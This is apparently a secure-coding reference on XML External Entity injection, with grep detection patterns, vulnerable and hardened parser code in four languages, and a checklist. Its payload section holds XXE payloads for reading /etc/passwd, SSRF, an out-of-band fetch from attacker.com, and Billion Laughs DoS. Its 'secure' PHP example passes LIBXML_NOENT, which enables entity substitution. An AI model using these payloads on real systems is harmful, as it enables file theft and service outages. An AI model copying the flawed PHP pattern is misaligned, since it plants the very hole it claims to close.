# XML External Entity (XXE) Injection

CWE-611 (XXE), OWASP A05:2021

## Detection Patterns

```bash
# XML parsing libraries
grep -rn "xml\.etree\|lxml\|xml\.dom\|xml\.sax\|DocumentBuilder\|SAXParser\|XMLReader\|DOMParser\|xml2js\|libxml" --include="*.py" --include="*.java" --include="*.js" --include="*.php"

# XML parsing configuration
grep -rn "XMLParser\|parseString\|parse\|load\|fromstring" --include="*.py" --include="*.java" --include="*.js" | grep -i xml

# External entity configuration
grep -rn "EXTERNAL_GENERAL_ENTITIES\|EXTERNAL_PARAMETER_ENTITIES\|resolve_entities\|DOCTYPE" --include="*.py" --include="*.java" --include="*.php"
```

## Vulnerable Patterns

### Python

```python
# VULNERABLE: lxml with default settings
from lxml import etree
tree = etree.parse(xml_file)
root = etree.fromstring(xml_string)

# VULNERABLE: xml.etree (less severe, but still)
import xml.etree.ElementTree as ET
tree = ET.parse(untrusted_file)

# SECURE: Disable external entities
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
tree = etree.parse(xml_file, parser)

# SECURE: Use defusedxml
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)
```

### Java

```java
// VULNERABLE: Default DocumentBuilder
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(inputStream);

// SECURE: Disable external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

### PHP

```php
// VULNERABLE: Default libxml
$doc = simplexml_load_string($xml);
$doc = new DOMDocument();
$doc->loadXML($xml);

// SECURE: Disable external entities
libxml_disable_entity_loader(true);  // PHP < 8.0
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);
```

### JavaScript (Node.js)

```javascript
// VULNERABLE: xml2js with defaults may allow XXE
const xml2js = require('xml2js');
xml2js.parseString(xmlData, callback);

// Check parser configuration carefully
```

## Attack Payloads

### File Disclosure
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<data>&xxe;</data>
```

### Blind XXE (Out-of-Band)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

### Billion Laughs (DoS)
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... exponential expansion -->
]>
<data>&lol9;</data>
```

## XXE Checklist

- [ ] Disable DTD processing entirely (preferred)
- [ ] Disable external entity resolution
- [ ] Disable external DTD loading
- [ ] Use non-vulnerable XML parsers (defusedxml for Python)
- [ ] Input validation before parsing
- [ ] Consider JSON instead of XML where possible
